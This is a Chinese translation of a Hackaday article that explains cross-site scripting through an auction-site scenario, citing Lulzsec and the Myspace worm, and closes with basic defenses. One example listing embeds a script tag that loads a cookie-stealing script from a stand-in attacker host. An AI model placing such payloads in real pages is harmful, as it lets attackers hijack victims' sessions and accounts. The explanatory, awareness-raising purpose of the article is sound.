# 黑暗艺术:跨站脚本

> 原文：<https://hackaday.com/2016/03/23/the-dark-arts-cross-site-scripting/>

2011 年，一群被称为 Lulzsec 的黑客连续两个月疯狂入侵数十个网站，包括福克斯、PBS、联邦调查局、索尼和其他许多公司的网站。该组织最终被抓获，并被问及他们是如何进行如此多的黑客攻击的。人们会发现，在现实生活中，没有一个黑客真正认识彼此。他们甚至不知道对方的真名。他们只在隐藏在互联网黑暗角落的隐蔽聊天室里交谈，并以各自的化名互相认识——[特弗洛]、[萨布]、[托皮里]、[凯拉]等等。每个人都有自己的特殊技能，当他们结合在一起时，他们是一个非常有效的黑客团队。
![](img/f6ddc6ceb4b329a71b00d5f73c6a4c16.png)

据发现，他们使用了三种主要的方法来破解网站——SQL 注入、跨站脚本和远程文件包含。我们在本系列的[前一篇文章](https://hackaday.com/2016/03/09/the-dark-arts-sql-injection-and-secure-passwords/)中对 SQL 注入攻击的工作原理做了基本概述。在本文中，我们将对跨站点脚本，或简称为 XSS，做同样的事情。从潜在数据丢失的角度来看，SQL 注入被称为人类历史上最大的漏洞。跨站点脚本紧随其后。让我们来看看它是如何工作的。

## XSS 情景

让我们假设你想在你最喜欢的买卖拍卖网站上出售一台 Arduino。首先要做的是登录服务器。在此过程中，来自该服务器的 cookie 将存储在您的计算机上。每当你在浏览器中加载该网站时，它会将该 cookie 与你的 HTTP 请求一起发送到服务器，让它知道是你，使你不必每次访问都登录。正是这块饼干将成为我们攻击的目标。

然后你会打开某种类型的窗口，允许你输入对你的 Arduino 的描述，潜在的买家可以阅读。让我们想象你说了这样的话:

```
Arduino Uno in perfect condition. New in Box. $15 plus shipping.
```

您将保存您的描述，它将存储在服务器的数据库中。到目前为止，我们的场景没有任何异常或可疑之处。但是让我们来看看当一个潜在的买家登录到服务器时会发生什么。他们需要一台 Arduino，并看到您刚刚发布的广告。当他们加载你的帖子时，他们的浏览器会看到什么？

```
Arduino Uno in perfect condition. <b>New in Box</b>. $15 plus shipping.
```

![xss_02](img/33c162fe89e3d601481a64dd616f0c87.png)

[Source](https://security.googleblog.com/2011/05/website-security-for-webmasters.html)

不管你是否意识到，你只是在他们的电脑上运行 HTML 代码(以**粗体**标签的形式)，尽管这些无害的代码做了买卖双方都想做的事情——突出产品的特定卖点。但是你还能运行什么代码呢？你能运行代码来做一些买家肯定*不*想要的事情吗？可以在任何一台加载 post 的计算机上运行的代码？你不仅应该能够看到我们的发展方向，你还应该能够看到问题的范围以及它有多危险。

现在让我们想象一个 Lulzsec 黑客正在寻找一些急需的 lulz。他看到你的帖子，几乎立刻就意识到你可以在他的电脑上运行 HTML 代码。然后他在网站上做了一个销售广告:

```
Lot of 25 Raspberry Pi Zeros - New in Box - < script src="http://lulz.com/email_me_your_cookie.js" ></script> - $100, free shipping.
```

现在，只要有人打开黑客的广告，脚本部分就会加载恶意的场外代码，并窃取受害者的会话 cookie。通常，只有 cookie 中指定的网站可以访问该 cookie。这里，由于恶意代码是从拍卖网站的服务器提供的，受害者的浏览器发送拍卖网站的 cookie 没有问题。现在，黑客可以将 cookie 加载到他的浏览器中来模拟受害者，从而允许黑客访问受害者可以访问的所有内容。

## 无尽的机会

只要稍加想象，您就可以看到跨站点脚本攻击可以达到的程度。您可以设想一种更有针对性的攻击，黑客试图通过利用有缺陷的竞争进入流程进入像英特尔这样的大公司。黑客访问 Intel Edison 竞赛参赛页面，发现他可以运行应用提交表单中的代码。他知道英特尔内部网上有人可能会阅读他的应用程序，并猜测这将通过浏览器完成。一旦不知情的英特尔员工打开他的入口，他的 XSS 攻击就会开始。

这种攻击可以在任何允许包含代码在另一台计算机上执行的用户输入中运行。以评论框为例。在评论框中输入某种类型的`< script >evil</script>`,它会加载到每一台加载该页面的电脑上。正如我们在本系列的[上一篇文章](http://hackaday.com/2016/03/09/the-dark-arts-sql-injection-and-secure-passwords/)的开头所讨论的，Samy Kamkar 使用了类似的技术来完成他著名的 Myspace 蠕虫。XSS 一度甚至可以用[图像](http://kestas.kuliukas.com/JavaScriptImage/)来完成。

## 防止 XSS 袭击

与基于 SQLi 的攻击一样，在这个时代，几乎所有的网站开发人员都知道 XSS，并采取积极的措施来防止它。一种预防措施是验证输入。试图在大多数不应该运行 JavaScript 的应用程序中运行 JavaScript 不仅会给你一个错误，而且很可能会将你的帐户标记为不怀好意。

![xss_03](img/cd4596c2eb525df2bf9c9f7345db8a92.png)

[Source](https://www.tinfoilsecurity.com/blog/hackers-think-cookies-are-tasty-too)

你可以做的一件事就是使用所谓的[沙盒浏览器](http://www.howtogeek.com/169139/sandboxes-explained-how-theyre-already-protecting-you-and-how-to-sandbox-any-program/)来保护自己免受这种攻击。这将在浏览器中运行的代码保存在一个“盒子”中，并保证计算机其他部分的安全。大多数现代浏览器都内置了这项技术。更激烈的措施是完全禁止 JavaScript 在你的电脑上运行。

这里有人比我更了解这类黑客技术。我希望让普通的硬件黑客对 XSS 及其工作原理有一个基本的了解。我们欢迎那些对跨站点脚本和其他网站黑客技术有更深入了解的人的评论，这将有助于加深每个人对这些重要主题的理解。

**来源**

[XSS Flash 动画 1](https://www.virtualforge.com/vmovie/xss_lesson_1/xss_selling_platform_v1.0.html)

[XSS Flash 动画 2](https://www.virtualforge.com/vmovie/xss_lesson_2/xss_selling_platform_v2.0.html)